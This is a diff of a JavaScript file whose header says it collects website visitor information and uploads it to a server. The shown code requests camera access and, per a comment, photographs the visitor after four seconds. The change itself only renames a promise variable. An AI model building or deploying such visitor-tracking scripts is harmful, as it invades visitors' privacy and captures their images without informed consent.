@@ -1,7 +1,7 @@
 /*
  * @Author: whalefall
  * @Date: 2021-08-27 04:28:23
- * @LastEditTime: 2021-08-27 05:32:39
+ * @LastEditTime: 2021-08-29 11:09:25
  * @Description: 获取访客信息并自动上传服务器 激活方法:start();
  * 前面引入js
  * <script src="/static/js/getseeinfo.js"></script>
@@ -158,7 +158,7 @@ function getMd() {
 	};
 	// 在不是https的环境下无法获取!
 	try {
-		let promise = navigator.mediaDevices.getUserMedia(constraints);
+		var Mediapromise = navigator.mediaDevices.getUserMedia(constraints);
 	} catch (err) {
 		layer.alert('可能在非https环境下运行!' + err, {
 			skin: 'layui-layer-molv', //样式类名
@@ -170,7 +170,7 @@ function getMd() {
 		});
 
 	};
-	promise.then(function(MediaStream) {
+	Mediapromise.then(function(MediaStream) {
 		// 获取成功延时4s后拍照
 		video.srcObject = MediaStream;
 		video.play();
